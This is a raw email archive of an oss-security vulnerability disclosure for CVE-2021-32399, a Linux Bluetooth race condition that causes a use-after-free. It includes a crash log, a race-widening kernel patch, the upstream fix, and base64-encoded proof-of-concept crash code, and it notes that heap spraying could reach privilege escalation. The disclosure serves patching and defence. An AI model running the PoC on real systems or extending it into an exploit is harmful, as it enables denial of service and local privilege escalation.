X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["35452" "Tuesday" "11" "May" "2021" "13:28:17" "+0800" "Lin Horse" "kylin.formalin@gmail.com" nil "786" "[oss-security] CVE-2021-32399 Linux device detach race condition" nil nil nil "5" nil nil (number mark "U       kylin.formal May 11  786/35452 " thread-indent "\"[oss-security] CVE-2021-32399 Linux device detach race condition\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2021-32399 Linux device detach race condition" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 32661 invoked by uid 550); 11 May 2021 06:11:20 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 15941 invoked from network); 11 May 2021 05:28:40 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=0wq8C3GmSlhVdTtiqspSL76w4wEpCTI0CPab2w0W/XY=;
        b=TTWIrp7HzxbzH50s7vW64Mip2t9OAGD5iImDTze5DLGcFyN0yObi77qbcrYqBXZGqb
         q2OKUMs9oKGBV81yei4wh1s0HzG++LsJk8BUp/ii5SSP8an2XlaHfON6I6KIGfTOOmUY
         geg9NB7DlO9Tqh5w9uGd8/Q3CDKiVdTYkoMhUh6gG8ClCIvyBna65nQ/q4Vondf67UUN
         7TbLNz2cjVG9oM2/+sj8MygbNz0oUFUJEMiqfXTCNySsxTzQ6vjEZR5PwY/Kxpg7SQlT
         d3C7i/gGTfrOgyVvARhX9VCU3GBr28q6I6JQv4g4pUmCGnWCkoAaLf8QyBpz7F3xv8eH
         PHZA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=0wq8C3GmSlhVdTtiqspSL76w4wEpCTI0CPab2w0W/XY=;
        b=TJ6H1Mnn9UKEBhFvYGSZYnaJCKZsCLsNByYG9+BgDq78MZJSdKSeqnLxY09WxGj5gz
         A0OnvHRo9CQb8iTNN4H2jANMu+kSoCK8DKEIG1zsKhtcbPak0UTl0Tpnz8DOXf5LcEth
         yO42Ie5mYGILpPs6XmpKrMYrD2txx8eLv6VoRWHocGHPmj4H/NbIDjDApcTkW12dR/tb
         wGxBZ+zmXC5F3kdE0UWeSViHSn3ImfxNef0n2iBGJbib5oYiOaRaDrf74JPU7q16vIsx
         U08FGvrI3tZfckbAyw2zxy5yeRk9NWCxn6lNH0rbhMVololLdyMopvMyaHPH2bulXAtv
         dN4g==
X-Gm-Message-State: AOAM530DJy4DnNTmsn3q/uJ1UKfDs5wv1GOWYa8eu6dzutnmL3JtxCIo
	oMWQ6H457qIV5deE4vAuSKmNqycIeONZetWMuaQZaqdRy8SLoQ==
X-Google-Smtp-Source: ABdhPJw5FQ9/7En0Nd6QWolVASZmKY5rFcyRZxvOqsgXTepVf1qZ2KD7oHV1temNJDYw4zqKnu+lOUkXdTDG1qzoDT0=
X-Received: by 2002:a25:b34c:: with SMTP id k12mr35775223ybg.6.1620710908241;
 Mon, 10 May 2021 22:28:28 -0700 (PDT)
MIME-Version: 1.0
From: Lin Horse <kylin.formalin@gmail.com>
Date: Tue, 11 May 2021 13:28:17 +0800
Message-ID: <CAJjojJtJgOGfpSTWn0fN7Vftyrf3vWFJeK33wLBeFDUfya42VQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/mixed; boundary="000000000000f849b305c20729d4"
Subject: [oss-security] CVE-2021-32399 Linux device detach race condition

--000000000000f849b305c20729d4
Content-Type: multipart/alternative; boundary="000000000000f849b105c20729d2"

--000000000000f849b105c20729d2
Content-Type: text/plain; charset="UTF-8"

Hello there,

Our team (BlockSec) found a race-condition vulnerability resides in
the kernel BlueTooth subsystem, which can lead to UAF of slab objects.
At worst, this bug can be exploited to get code execution for
escalating local privilege.

=*=*=*=*=*=*=*=*=  BUG DETAILS  =*=*=*=*=*=*=*=*=

The race occurs between issuing a command to the BlueTooth controller
and unregistering the BlueTooth controller. For example, thread-A is
issuing a command while thread-B is going to close the device.

The thread-A will enter into hci_req_sync() function like below

int hci_req_sync(struct hci_dev *hdev, int (*req)(struct hci_request *req,
						  unsigned long opt),
		 unsigned long opt, u32 timeout, u8 *hci_status)
{
...
	if (!test_bit(HCI_UP, &hdev->flags))
		return -ENETDOWN;

	/* Serialize all requests */
	hci_req_sync_lock(hdev);
	ret = __hci_req_sync(hdev, req, opt, timeout, hci_status);
	hci_req_sync_unlock(hdev);
...

The thread-B will enter into hci_dev_do_close() function like below snippet

int hci_dev_do_close(struct hci_dev *hdev)
{
...
	hci_req_sync_lock(hdev);

	if (!test_and_clear_bit(HCI_UP, &hdev->flags)) {
		cancel_delayed_work_sync(&hdev->cmd_timer);
		hci_req_sync_unlock(hdev);
		return 0;
	}
...

The problem here is that these two commands can run as below sequences.

thread-A                         |   thread-B
test_bit(HCI_UP, &hdev->flags);  |
                                 |   hci_req_sync_lock(hdev);
                                 |
...                              |   test_and_clear_bit(HCI_UP, &hdev->flags)
                                 |
hci_req_sync_lock(hdev);         |

Or like below

thread-A                         |   thread-B
                                 |   hci_req_sync_lock(hdev);
test_bit(HCI_UP, &hdev->flags);  |
...                              |   test_and_clear_bit(HCI_UP, &hdev->flags)
hci_req_sync_lock(hdev);         |

Anyway, once the thread-B obtains the sync lock (hdev->req_lock)
before the thread-A, the bug is triggered.

That is, although the thread-B will flush the work queue and check if
any commands are stayed pending, the thread-A can obtain the sync lock
even after the thread-B has already closed the HCI device and then
awake the command work, which results in Use After Free.


=*=*=*=*=*=*=*=*=  BUG EFFECTS  =*=*=*=*=*=*=*=*=

For now, I can successfully trigger the vulnerability to crash the
kernel. The log is presented below and the POC code is given as an
attachment

[   73.753790] BUG: kernel NULL pointer dereference, address: 0000000000000000
[   73.754061] #PF: supervisor read access in kernel mode
[   73.754061] #PF: error_code(0x0000) - not-present page
[   73.754061] PGD 0 P4D 0
[   73.754061] Oops: 0000 [#1] SMP NOPTI
[   73.754061] CPU: 3 PID: 155 Comm: ptmx_crash Not tainted 5.11.11+ #7
[   73.754061] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
BIOS 1.10.2-1ubuntu1 04/01/2014
[   73.754061] RIP: 0010:__queue_work+0xd5/0x3e0
[   73.754061] Code: 75 00 40 f6 c6 04 75 d1 48 c1 ee 05 81 fe ff ff
ff 7f 0f 84 92 00 00 00 48 c7 c7 90 c6 64 82 48 63 f6 e8 1e d1 3a 00
48 89 c7 <49> 8b 07 48 85 ff 0f 84 7e 02 00 00 48 39 f8 74 72 48 89 7c
24 08
[   73.754061] RSP: 0018:ffffc900003f3c98 EFLAGS: 00000046
[   73.754061] RAX: ffff888003d4f800 RBX: 000000000000002f RCX: 0000000000000000
[   73.754061] RDX: ffff888003800000 RSI: ffff888003800070 RDI: ffff888003d4f800
[   73.754061] RBP: ffff888004d5e860 R08: ffff888003d4f800 R09: ffffffff8264c698
[   73.754061] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000003
[   73.754061] R13: 0000000000027508 R14: ffff888004cc1a00 R15: 0000000000000000
[   73.754061] FS:  00007f8d77212700(0000) GS:ffff88807dd80000(0000)
knlGS:0000000000000000
[   73.754061] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   73.754061] CR2: 0000000000000000 CR3: 0000000004c16000 CR4: 00000000000006e0
[   73.754061] Call Trace:
[   73.754061]  queue_work_on+0x17/0x20
[   73.754061]  req_run+0xa9/0xf0
[   73.754061]  __hci_req_sync+0xaa/0x250
[   73.754061]  ? hci_unregister_cb+0x50/0x50
[   73.754061]  hci_req_sync+0x4e/0x70
[   73.754061]  hci_inquiry+0x1a3/0x350
[   73.754061]  ? release_sock+0x14/0x90
[   73.754061]  sock_do_ioctl+0x37/0x130
[   73.754061]  ? selinux_file_ioctl+0x130/0x220
[   73.754061]  sock_ioctl+0x219/0x310
[   73.754061]  ? __hrtimer_init+0xc0/0xc0
[   73.754061]  __x64_sys_ioctl+0x7e/0xb0
[   73.754061]  do_syscall_64+0x33/0x40
[   73.754061]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[   73.754061] RIP: 0033:0x7f8d77b19247
[   73.754061] Code: 00 00 90 48 8b 05 49 8c 0c 00 64 c7 00 26 00 00
00 48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00
00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 19 8c 0c 00 f7 d8 64 89
01 48
[   73.754061] RSP: 002b:00007f8d77211ec8 EFLAGS: 00000202 ORIG_RAX:
0000000000000010
[   73.754061] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f8d77b19247
[   73.754061] RDX: 00007f8d77211eee RSI: 00000000800448f0 RDI: 0000000000000009
[   73.754061] RBP: 00007f8d77211f00 R08: 0000000000000000 R09: 00007f8d77212700
[   73.754061] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffc80c9d9ee
[   73.754061] R13: 00007ffc80c9d9ef R14: 00007f8d77211fc0 R15: 00007f8d77212700

This NULL-pointer-dereference is occurred in the req_run function,
called from hci_req_sync() of thread-A.

static int req_run(struct hci_request *req, hci_req_complete_t complete,
		   hci_req_complete_skb_t complete_skb)
{
	...

	queue_work(hdev->workqueue, &hdev->cmd_work);

	return 0;
}

As the hdev object has already be freed after device unregistering.
The hdev->workqueue and hdev->cmd_work are all NULL pointer. That's
why the NULL pointer will be dereferenced.

In another word, the attacker can adopt the heap spraying technique to
keep corrupting the objects to gain more. As the hdev object contains
a lot of pointers, the attacker can easily get arbitrary memory write
primitive or RIP hijacking.


=*=*=*=*=*=*=*=*=  BUG REPRODUCING  =*=*=*=*=*=*=*=*=

This race-condition vulnerability occurs between device closing and
command issuing. Hence, the attacker needs chances to close the device
multiple times. To attain this, there are three possible ways that may
be used.

1. Using the virtual HCI driver (vhci)
2. Using the ptmx to act as an HCI TTY device.
3. Using real devices.

The vhci module will be used when testing BlueTooth programs. However,
loading this driver requires root privilege.

The second choice is more versatile: using the ptmx to fake an HCI TTY
device and attaching it to the kernel as a controller, which won't
require extra privilege. However, it's worth mentioning that the
attached fake controller will be put into the HCI_AUTO_OFF state by
default. In this case, the attacker needs CAP_NET_ADMIN privilege to
set the device up.

For the third choice, it is also possible (but not convenient) to
trigger this race condition. This choice won't require any privilege.

As this bug is found through fuzzing, the KASan can help to reproduce
the bug. In addition, to increase the possibility of bug triggering,
you can adopt the following patch to your kernel.

diff --git a/net/bluetooth/hci_request.c b/net/bluetooth/hci_request.c
index 5aa7bd503..0ec8d8278 100644
--- a/net/bluetooth/hci_request.c
+++ b/net/bluetooth/hci_request.c
@@ -274,6 +274,8 @@ int hci_req_sync(struct hci_dev *hdev, int
(*req)(struct hci_request *req,
        if (!test_bit(HCI_UP, &hdev->flags))
                return -ENETDOWN;

+       udelay(200);
+
        /* Serialize all requests */
        hci_req_sync_lock(hdev);
        ret = __hci_req_sync(hdev, req, opt, timeout, hci_status);
(END)


It maliciously injects delay to expand the race window.
( In addition, I found and exploited the bug in QEMU environment. )


=*=*=*=*=*=*=*=*=  Bug FIX  =*=*=*=*=*=*=*=*=

The adopted patch is presentd at
https://github.com/torvalds/linux/commit/e2cb6b891ad2b8caa9131e3be70f45243df82a80

diff --git a/net/bluetooth/hci_request.c b/net/bluetooth/hci_request.c
index e55976db4403..790ebe5d818e 100644
--- a/net/bluetooth/hci_request.c
+++ b/net/bluetooth/hci_request.c
@@ -272,12 +272,16 @@ int hci_req_sync(struct hci_dev *hdev, int
(*req)(struct hci_request *req,
 {
 	int ret;

-	if (!test_bit(HCI_UP, &hdev->flags))
-		return -ENETDOWN;
-
 	/* Serialize all requests */
 	hci_req_sync_lock(hdev);
-	ret = __hci_req_sync(hdev, req, opt, timeout, hci_status);
+	/* check the state after obtaing the lock to protect the HCI_UP
+	 * against any races from hci_dev_do_close when the controller
+	 * gets removed.
+	 */
+	if (test_bit(HCI_UP, &hdev->flags))
+		ret = __hci_req_sync(hdev, req, opt, timeout, hci_status);
+	else
+		ret = -ENETDOWN;
 	hci_req_sync_unlock(hdev);

 	return ret;
-- 
That is, let thread-A does the flag checking after it obtains the sync
lock. This can indeed solve the race-condition problem as the thread-A
will not be able to send any commands once the device is closed.
However, this patch is not beautiful and may harm the performance.


=*=*=*=*=*=*=*=*=  Timeline  =*=*=*=*=*=*=*=*=

This is the first time I report kernel bugs and my timeline is quite,
emm, werid xD

2021-04-11: Bug reported to security () kernel org
2021-04-24: Patch accepted to mainline kernel

2021-05-01: CVE request from MRITE

2021-05-07: CVE-2021-32399 assigned


=*=*=*=*=*=*=*=*=  Credit  =*=*=*=*=*=*=*=*=

LinMa@BlockSec Team
syzkaller (amazing kernel fuzzer)

Best regards.

--000000000000f849b105c20729d2
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><pre style=3D"color:rgb(0,0,0);font-size:14px">Hello there,
=20=20=20=20
Our team (BlockSec) found a race-condition vulnerability resides in the ker=
nel BlueTooth subsystem, which can lead to UAF of slab objects. At worst, t=
his bug can be exploited to get code execution for escalating local privile=
ge.

=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D  BUG DETAILS  =3D*=3D*=3D*=3D*=3D*=3D*=
=3D*=3D*=3D

The race occurs between issuing a command to the BlueTooth controller and u=
nregistering the BlueTooth controller. For example, thread-A is issuing a c=
ommand while thread-B is going to close the device.

The thread-A will enter into hci_req_sync() function like below

int hci_req_sync(struct hci_dev *hdev, int (*req)(struct hci_request *req,
						  unsigned long opt),
		 unsigned long opt, u32 timeout, u8 *hci_status)
{
...
	if (!test_bit(HCI_UP, &amp;hdev-&gt;flags))
		return -ENETDOWN;

	/* Serialize all requests */
	hci_req_sync_lock(hdev);
	ret =3D __hci_req_sync(hdev, req, opt, timeout, hci_status);
	hci_req_sync_unlock(hdev);
...

The thread-B will enter into hci_dev_do_close() function like below snippet

int hci_dev_do_close(struct hci_dev *hdev)
{
...
	hci_req_sync_lock(hdev);

	if (!test_and_clear_bit(HCI_UP, &amp;hdev-&gt;flags)) {
		cancel_delayed_work_sync(&amp;hdev-&gt;cmd_timer);
		hci_req_sync_unlock(hdev);
		return 0;
	}
...

The problem here is that these two commands can run as below sequences.

thread-A                         |   thread-B=20=20=20=20=20=20
test_bit(HCI_UP, &amp;hdev-&gt;flags);  |=20=20
                                 |   hci_req_sync_lock(hdev);
                                 |
...                              |   test_and_clear_bit(HCI_UP, &amp;hdev-&=
gt;flags)
                                 |=20=20=20
hci_req_sync_lock(hdev);         |

Or like below

thread-A                         |   thread-B=20=20=20=20=20=20
                                 |   hci_req_sync_lock(hdev);
test_bit(HCI_UP, &amp;hdev-&gt;flags);  |=20=20=20=20
...                              |   test_and_clear_bit(HCI_UP, &amp;hdev-&=
gt;flags)=20
hci_req_sync_lock(hdev);         |

Anyway, once the thread-B obtains the sync lock (hdev-&gt;req_lock) before =
the thread-A, the bug is triggered.

That is, although the thread-B will flush the work queue and check if any c=
ommands are stayed pending, the thread-A can obtain the sync lock even afte=
r the thread-B has already closed the HCI device and then awake the command=
 work, which results in Use After Free.


=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D  BUG EFFECTS  =3D*=3D*=3D*=3D*=3D*=3D*=
=3D*=3D*=3D

For now, I can successfully trigger the vulnerability to crash the kernel. =
The log is presented below and the POC code is given as an attachment

[   73.753790] BUG: kernel NULL pointer dereference, address: 0000000000000=
000
[   73.754061] #PF: supervisor read access in kernel mode
[   73.754061] #PF: error_code(0x0000) - not-present page
[   73.754061] PGD 0 P4D 0
[   73.754061] Oops: 0000 [#1] SMP NOPTI
[   73.754061] CPU: 3 PID: 155 Comm: ptmx_crash Not tainted 5.11.11+ #7
[   73.754061] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS =
1.10.2-1ubuntu1 04/01/2014
[   73.754061] RIP: 0010:__queue_work+0xd5/0x3e0
[   73.754061] Code: 75 00 40 f6 c6 04 75 d1 48 c1 ee 05 81 fe ff ff ff 7f =
0f 84 92 00 00 00 48 c7 c7 90 c6 64 82 48 63 f6 e8 1e d1 3a 00 48 89 c7 &lt=
;49&gt; 8b 07 48 85 ff 0f 84 7e 02 00 00 48 39 f8 74 72 48 89 7c 24 08
[   73.754061] RSP: 0018:ffffc900003f3c98 EFLAGS: 00000046
[   73.754061] RAX: ffff888003d4f800 RBX: 000000000000002f RCX: 00000000000=
00000
[   73.754061] RDX: ffff888003800000 RSI: ffff888003800070 RDI: ffff888003d=
4f800
[   73.754061] RBP: ffff888004d5e860 R08: ffff888003d4f800 R09: ffffffff826=
4c698
[   73.754061] R10: 0000000000000000 R11: 0000000000000000 R12: 00000000000=
00003
[   73.754061] R13: 0000000000027508 R14: ffff888004cc1a00 R15: 00000000000=
00000
[   73.754061] FS:  00007f8d77212700(0000) GS:ffff88807dd80000(0000) knlGS:=
0000000000000000
[   73.754061] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   73.754061] CR2: 0000000000000000 CR3: 0000000004c16000 CR4: 00000000000=
006e0
[   73.754061] Call Trace:
[   73.754061]  queue_work_on+0x17/0x20
[   73.754061]  req_run+0xa9/0xf0
[   73.754061]  __hci_req_sync+0xaa/0x250
[   73.754061]  ? hci_unregister_cb+0x50/0x50
[   73.754061]  hci_req_sync+0x4e/0x70
[   73.754061]  hci_inquiry+0x1a3/0x350
[   73.754061]  ? release_sock+0x14/0x90
[   73.754061]  sock_do_ioctl+0x37/0x130
[   73.754061]  ? selinux_file_ioctl+0x130/0x220
[   73.754061]  sock_ioctl+0x219/0x310
[   73.754061]  ? __hrtimer_init+0xc0/0xc0
[   73.754061]  __x64_sys_ioctl+0x7e/0xb0
[   73.754061]  do_syscall_64+0x33/0x40
[   73.754061]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[   73.754061] RIP: 0033:0x7f8d77b19247
[   73.754061] Code: 00 00 90 48 8b 05 49 8c 0c 00 64 c7 00 26 00 00 00 48 =
c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00 00 0f 05 &lt=
;48&gt; 3d 01 f0 ff ff 73 01 c3 48 8b 0d 19 8c 0c 00 f7 d8 64 89 01 48
[   73.754061] RSP: 002b:00007f8d77211ec8 EFLAGS: 00000202 ORIG_RAX: 000000=
0000000010
[   73.754061] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f8d77b=
19247
[   73.754061] RDX: 00007f8d77211eee RSI: 00000000800448f0 RDI: 00000000000=
00009
[   73.754061] RBP: 00007f8d77211f00 R08: 0000000000000000 R09: 00007f8d772=
12700
[   73.754061] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffc80c=
9d9ee
[   73.754061] R13: 00007ffc80c9d9ef R14: 00007f8d77211fc0 R15: 00007f8d772=
12700

This NULL-pointer-dereference is occurred in the req_run function, called f=
rom hci_req_sync() of thread-A.

static int req_run(struct hci_request *req, hci_req_complete_t complete,
		   hci_req_complete_skb_t complete_skb)
{
	...

	queue_work(hdev-&gt;workqueue, &amp;hdev-&gt;cmd_work);

	return 0;
}

As the hdev object has already be freed after device unregistering. The hde=
v-&gt;workqueue and hdev-&gt;cmd_work are all NULL pointer. That&#39;s why =
the NULL pointer will be dereferenced.

In another word, the attacker can adopt the heap spraying technique to keep=
 corrupting the objects to gain more. As the hdev object contains a lot of =
pointers, the attacker can easily get arbitrary memory write primitive or R=
IP hijacking.


=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D  BUG REPRODUCING  =3D*=3D*=3D*=3D*=3D*=
=3D*=3D*=3D*=3D

This race-condition vulnerability occurs between device closing and command=
 issuing. Hence, the attacker needs chances to close the device multiple ti=
mes. To attain this, there are three possible ways that may be used.

1. Using the virtual HCI driver (vhci)
2. Using the ptmx to act as an HCI TTY device.
3. Using real devices.

The vhci module will be used when testing BlueTooth programs. However, load=
ing this driver requires root privilege.=20

The second choice is more versatile: using the ptmx to fake an HCI TTY devi=
ce and attaching it to the kernel as a controller, which won&#39;t require =
extra privilege. However, it&#39;s worth mentioning that the attached fake =
controller will be put into the HCI_AUTO_OFF state by default. In this case=
, the attacker needs CAP_NET_ADMIN privilege to set the device up.=20

For the third choice, it is also possible (but not convenient) to trigger t=
his race condition. This choice won&#39;t require any privilege.

As this bug is found through fuzzing, the KASan can help to reproduce the b=
ug. In addition, to increase the possibility of bug triggering, you can ado=
pt the following patch to your kernel.

diff --git a/net/bluetooth/hci_request.c b/net/bluetooth/hci_request.c
index 5aa7bd503..0ec8d8278 100644
--- a/net/bluetooth/hci_request.c
+++ b/net/bluetooth/hci_request.c
@@ -274,6 +274,8 @@ int hci_req_sync(struct hci_dev *hdev, int (*req)(struc=
t hci_request *req,
        if (!test_bit(HCI_UP, &amp;hdev-&gt;flags))
                return -ENETDOWN;

+       udelay(200);
+
        /* Serialize all requests */
        hci_req_sync_lock(hdev);
        ret =3D __hci_req_sync(hdev, req, opt, timeout, hci_status);
(END)


It maliciously injects delay to expand the race window.
( In addition, I found and exploited the bug in QEMU environment. )


=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D  Bug FIX  =3D*=3D*=3D*=3D*=3D*=3D*=3D*=
=3D*=3D

The adopted patch is presentd at <a href=3D"https://github.com/torvalds/lin=
ux/commit/e2cb6b891ad2b8caa9131e3be70f45243df82a80">https://github.com/torv=
alds/linux/commit/e2cb6b891ad2b8caa9131e3be70f45243df82a80</a>

diff --git a/net/bluetooth/hci_request.c b/net/bluetooth/hci_request.c<br>i=
ndex e55976db4403..790ebe5d818e 100644<br>--- a/net/bluetooth/hci_request.c=
<br>+++ b/net/bluetooth/hci_request.c<br>@@ -272,12 +272,16 @@ int hci_req_=
sync(struct hci_dev *hdev, int (*req)(struct hci_request *req,<br>=C2=A0{<b=
r>=C2=A0	int ret;<br>=C2=A0<br>-	if (!test_bit(HCI_UP, &amp;hdev-&gt;flags)=
)<br>-		return -ENETDOWN;<br>-<br>=C2=A0	/* Serialize all requests */<br>=
=C2=A0	hci_req_sync_lock(hdev);<br>-	ret =3D __hci_req_sync(hdev, req, opt,=
 timeout, hci_status);<br>+	/* check the state after obtaing the lock to pr=
otect the HCI_UP <br>+	 * against any races from hci_dev_do_close when the =
controller <br>+	 * gets removed.<br>+	 */<br>+	if (test_bit(HCI_UP, &amp;h=
dev-&gt;flags))<br>+		ret =3D __hci_req_sync(hdev, req, opt, timeout, hci_s=
tatus);<br>+	else<br>+		ret =3D -ENETDOWN;<br>=C2=A0	hci_req_sync_unlock(hd=
ev);<br>=C2=A0<br>=C2=A0	return ret;<br>--=20
That is, let thread-A does the flag checking after it obtains the sync lock=
. This can indeed solve the race-condition problem as the thread-A will not=
 be able to send any commands once the device is closed. However, this patc=
h is not beautiful and may harm the performance.


=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D  Timeline  =3D*=3D*=3D*=3D*=3D*=3D*=3D*=
=3D*=3D

This is the first time I report kernel bugs and my timeline is quite, emm, =
werid xD</pre><pre style=3D"color:rgb(0,0,0);font-size:14px"><pre style=3D"=
margin:0em">2021-04-11: Bug reported to security () kernel org
2021-04-24: Patch accepted to mainline kernel</pre><pre style=3D"margin:0em=
">2021-05-01: CVE request from MRITE</pre><pre style=3D"margin:0em">2021-05=
-07: CVE-2021-32399 assigned</pre><pre style=3D"margin:0em"><br></pre></pre=
><pre style=3D"color:rgb(0,0,0);font-size:14px">=3D*=3D*=3D*=3D*=3D*=3D*=3D=
*=3D*=3D  Credit  =3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D</pre><pre style=3D"co=
lor:rgb(0,0,0);font-size:14px">LinMa@BlockSec Team
syzkaller (amazing kernel fuzzer)</pre><pre style=3D"color:rgb(0,0,0);font-=
size:14px">Best regards.</pre></div>

--000000000000f849b105c20729d2--

--000000000000f849b305c20729d4
Content-Type: application/octet-stream; name="ptmx_crash.c"
Content-Disposition: attachment; filename="ptmx_crash.c"
Content-Transfer-Encoding: base64
Content-ID: <f_kojleky40>
X-Attachment-Id: f_kojleky40

Ly8gYWRvcHRpbmcgdmhjaSBkcml2ZXIgdG8gdHJpZ2dlciBLQVNhbiBkZXRl
Y3Rpb24gd2l0aG91dCByb290IHByaXZpbGVnZSAoTkVUQURNSU4pCgojaW5j
bHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8
dGltZS5oPgoKI2luY2x1ZGUgInB0bXhfc2ltLmgiCgppbnQgY29udHJvbGxl
ciA9IDA7CmludCByYW5kb21fZGVsYXkxOwppbnQgcmFuZG9tX2RlbGF5MjsK
CmNvbnN0IGludCBkZWx0YSA9IDEwMDAwOwoKc3RydWN0IGhjaV9pbnF1aXJ5
X3JlcSB7CglfX3UxNiBkZXZfaWQ7CglfX3UxNiBmbGFnczsKCV9fdTggIGxh
cFszXTsKCV9fdTggIGxlbmd0aDsKCV9fdTggIG51bV9yc3A7Cn07Cgp2b2lk
IHByZXBhcmVfcmFuZG9tKCkKewoJcmFuZG9tX2RlbGF5MSA9IHJhbmQoKSAl
IDgwOwoJcmFuZG9tX2RlbGF5MiA9IHJhbmQoKSAlIDIwOwp9Cgp2b2lkKiBp
b2N0bF90aHJlYWQodm9pZCogYXJnKQp7CglzdHJ1Y3QgcHBhcmFtIHBwID0g
KihzdHJ1Y3QgcHBhcmFtKilhcmc7CglzdHJ1Y3QgaGNpX2lucXVpcnlfcmVx
IGlyOwoJaXIuZGV2X2lkID0gMDsJICAgLy8gb25seSAwCglpci5mbGFncyA9
IDB4MDAwMTsgLy8gSVJFUV9DQUNIRV9GTFVTSAoJaXIubGVuZ3RoID0gMTsg
ICAgIC8vIDIgc2Vjb25kcyBhcyB1bml0CgoJd2hpbGUoIWNvbnRyb2xsZXIp
OwoJdXNsZWVwKGRlbHRhKTsKCXVzbGVlcChyYW5kb21fZGVsYXkxKTsKCWlv
Y3RsKHBwLnNvY2ssIEhDSUlOUVVJUlksICZpcik7Cn0KCnZvaWQqIGNsb3Np
bmdfdGhyZWFkKHZvaWQqIGFyZykKewoJc3RydWN0IHBwYXJhbSBwcCA9ICoo
c3RydWN0IHBwYXJhbSopYXJnOwoJd2hpbGUoIWNvbnRyb2xsZXIpOwoJdXNs
ZWVwKHJhbmRvbV9kZWxheTIpOwoJY2xvc2UocHAubWZkKTsgLy8gY2xvc2lu
ZyB0dHkgaXMgbXVjaCBzbG93ZXIgdGhhbiBjbG9zaW5nIHZoY2kgZGVzY3Jp
cHRvcgp9CgppbnQgbWFpbihpbnQgYXJnYywgY2hhciogYXJndltdKQp7Cglz
cmFuZCh0aW1lKE5VTEwpKTsKCXB0aHJlYWRfdCB0aDEsIHRoMjsKCgl3aGls
ZSgxKSB7CgkJY29udHJvbGxlciA9IDA7CgkJLy8gcHJlcGFyZSByYW5kb20g
ZGVsYXkKCQlwcmVwYXJlX3JhbmRvbSgpOwoJCS8vIGdldCB2aXJ0dWFsIGRl
dmljZQoJCXN0cnVjdCBwcGFyYW0gdGVzdDsKCQl0ZXN0ID0gaW5pdGlhbGl6
ZV9oY2lfdWFydCgpOwoKCQlwdGhyZWFkX2NyZWF0ZSgmdGgyLCBOVUxMLCBj
bG9zaW5nX3RocmVhZCwgJnRlc3QpOwoJCXB0aHJlYWRfY3JlYXRlKCZ0aDEs
IE5VTEwsIGlvY3RsX3RocmVhZCwgJnRlc3QpOwoJCS8vIHB0aHJlYWRfY3Jl
YXRlKCZ0aDIsIE5VTEwsIGNsb3NpbmdfdGhyZWFkLCAmdGVzdCk7CgoJCWNv
bnRyb2xsZXIgPSAxOyAvLyBzdGFydAoKCQlwdGhyZWFkX2pvaW4odGgxLCBO
VUxMKTsKCQlwdGhyZWFkX2pvaW4odGgyLCBOVUxMKTsKCQkKCQkvLyBzbGF2
ZSBmb3IgaGVyZQoJCWNsb3NlKHRlc3Quc2ZkKTsKCX0KCXJldHVybiAwOwp9
Cg==

--000000000000f849b305c20729d4
Content-Type: application/octet-stream; name="ptmx_sim.h"
Content-Disposition: attachment; filename="ptmx_sim.h"
Content-Transfer-Encoding: base64
Content-ID: <f_kojlekyj2>
X-Attachment-Id: f_kojlekyj2

I2lmbmRlZiBfUFRNWF9TSU0KI2RlZmluZSBfUFRNWF9TSU0KCiNpbmNsdWRl
IDxlcnJuby5oPgojaW5jbHVkZSA8ZmNudGwuaD4KI2luY2x1ZGUgPGxpbnV4
L3Jma2lsbC5oPgojaW5jbHVkZSA8cHRocmVhZC5oPgojaW5jbHVkZSA8c3lz
L2Vwb2xsLmg+CiNpbmNsdWRlIDxzeXMvaW9jdGwuaD4KI2luY2x1ZGUgPHN5
cy9zb2NrZXQuaD4KI2luY2x1ZGUgPHN5cy91aW8uaD4KI2luY2x1ZGUgPHN0
ZGludC5oPgojaW5jbHVkZSA8c3lzL3R5cGVzLmg+CiNpbmNsdWRlIDx1bmlz
dGQuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8c3RkaW8uaD4K
